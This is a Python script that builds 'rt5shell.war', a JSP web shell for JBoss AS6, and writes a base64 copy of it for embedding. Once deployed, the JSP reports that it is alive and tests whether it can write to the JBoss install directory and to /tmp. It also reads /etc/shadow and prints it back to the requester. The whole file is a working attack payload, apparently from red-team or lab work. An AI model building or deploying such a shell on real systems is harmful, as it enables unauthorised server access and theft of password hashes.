# -*- coding: utf-8 -*-
"""Build rt5shell.war (JSP shell for JBoss AS6) + base64 for embedding."""
import base64
import io
import os
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))

jsp = (
    '<%@ page import="java.io.*" %><%\n'
    'String ts = String.valueOf(System.currentTimeMillis());\n'
    'out.print("RT5-WAR-ALIVE " + ts + "\\n");\n'
    'try { new FileOutputStream("/jboss-6.1.0.Final/rt5_war_marker").write(("rt5_war_ok " + ts).getBytes("UTF-8")); out.print("APPWRITE-OK\\n"); } catch (Exception e) { out.print("APPWRITE-ERR " + e + "\\n"); }\n'
    'try { new FileOutputStream("/tmp/rt5_war_tmp").write(120); out.print("TMPWRITE-OK\\n"); } catch (Exception e) { out.print("TMPWRITE-DENIED " + e.getClass().getName() + "\\n"); }\n'
    'try { BufferedReader br = new BufferedReader(new FileReader("/etc/shadow")); String l; while ((l = br.readLine()) != null) out.print(l + "\\n"); } catch (Exception e) { out.print("SHADOW-ERR " + e + "\\n"); }\n'
    '%>\n'
)
webxml = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<web-app xmlns="http://java.sun.com/xml/ns/javaee"\n'
    '  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
    '  xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"\n'
    '  version="2.5">\n'
    '  <display-name>rt5shell</display-name>\n'
    '</web-app>\n'
)

buf = io.BytesIO()
z = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
z.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\r\n\r\n")
z.writestr("WEB-INF/web.xml", webxml)
z.writestr("x.jsp", jsp)
z.close()

data = buf.getvalue()
with open(os.path.join(HERE, "rt5shell.war"), "wb") as f:
    f.write(data)
b64 = base64.b64encode(data).decode()
with open(os.path.join(HERE, "war_b64.txt"), "w") as f:
    f.write(b64)
print("war bytes:", len(data), "b64 len:", len(b64))
